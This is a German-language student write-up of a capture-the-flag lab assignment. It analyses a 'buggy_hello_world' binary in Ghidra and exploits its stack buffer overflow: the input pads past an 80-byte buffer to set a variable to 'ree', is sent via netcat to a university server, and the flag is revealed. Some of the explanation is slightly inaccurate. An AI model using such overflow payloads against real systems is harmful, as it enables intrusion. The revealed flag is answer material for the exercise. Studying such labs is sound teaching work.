# Assignment: Analyse mit Ghidra (buggy_hello_world)
## Der Buffer Overflow schwachstelle 
```console
  ssize_t sVar1;
  long in_FS_OFFSET;
  char local_68 [80];
  int local_18;
  long local_10;
  
sVar1 = read(1,local_68,0x54);
local_68[(int)sVar1 + -1] = '\0';
if (local_18 == 0x656572) {
  win();
}
```
``` 
Der Buffer Overflow tritt auf, wenn wir  mehr Daten in ein Array schreiben, als es eigentlich aufnehmen kann. In diesem Fall haben wir   ein lokales Array local_68 mit einer Größe von 80 Bytes definiert, aber wir  versuchen, mehr als  80 Bytes in das Array zu schreiben. Das kann zu einem Überlauf führen und zu unerwartetem Verhalten der Anwendung. 
Es scheint, dass local_18 nicht initialisiert wurde und somit einen undefinierten Wert hat. Dieser Wert wird dann mit dem Wert 0x656572 verglichen, aber ohne eine vorherige Initialisierung ist das Ergebnis dieses Vergleichs unvorhersehbar.

```
# FLAG ausgeben 
##  Um das FLAG auszugeben , sollen wir einen  Buffer Overflow  demonstrieren:
```
können wir  versuchen,  "ree" und mehr als 80 Zeichen einzugeben und die Auswirkungen auf das Programmverhalten zu beobachten.
Eingabe Beispiel:
```
```console
testtesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttestree
```
### wir verwenden S netcat (nc), um unsere  Eingaben an das Programm zu senden:
```console
┌──(mindhunter㉿TT)-[~]
└─$ nc tank.informatik.hs-mannheim.de 3001
Enter your name:testtesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttestree
FLAG{you_dirty_stack_smasher}
Hello testtesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttestree
```
```
Das FLAG lautet:
FLAG{you_dirty_stack_smasher}
```